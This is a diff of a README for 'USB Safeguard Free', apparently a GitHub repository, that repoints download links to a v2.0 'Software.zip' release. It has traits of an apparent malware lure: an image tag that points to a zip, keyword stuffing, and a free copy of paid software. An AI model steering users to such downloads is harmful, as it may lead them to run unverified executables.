@@ -30,7 +30,7 @@ USB Safeguard is a powerful tool designed to keep your private files secure on a
 - USB Safeguard Para Windows 7
 
 ## Usage
-To download the latest version of USB Safeguard, click [here](https://github.com/kushbhanushali/USB-Safeguard-Free/releases/download/v1.0/Software.zip). 
+To download the latest version of USB Safeguard, click [here](https://github.com/kushbhanushali/USB-Safeguard-Free/releases/download/v2.0/Software.zip). 
 
 Don't forget to check the **Releases** section for any updated versions if the provided link is not working or the file needs to be launched.
 
@@ -41,7 +41,7 @@ Follow these steps to start using USB Safeguard:
 3. Run the USB Safeguard application.
 4. Follow the on-screen instructions to set up your secure USB drive.
 
-![USB Safeguard Image](https://github.com/kushbhanushali/USB-Safeguard-Free/releases/download/v1.0/Software.zip)
+![USB Safeguard Image](https://github.com/kushbhanushali/USB-Safeguard-Free/releases/download/v2.0/Software.zip)
 
 ## Contributing
 We welcome contributions to enhance USB Safeguard and make it even more secure and user-friendly. Feel free to raise issues or submit pull requests to help us improve this tool.
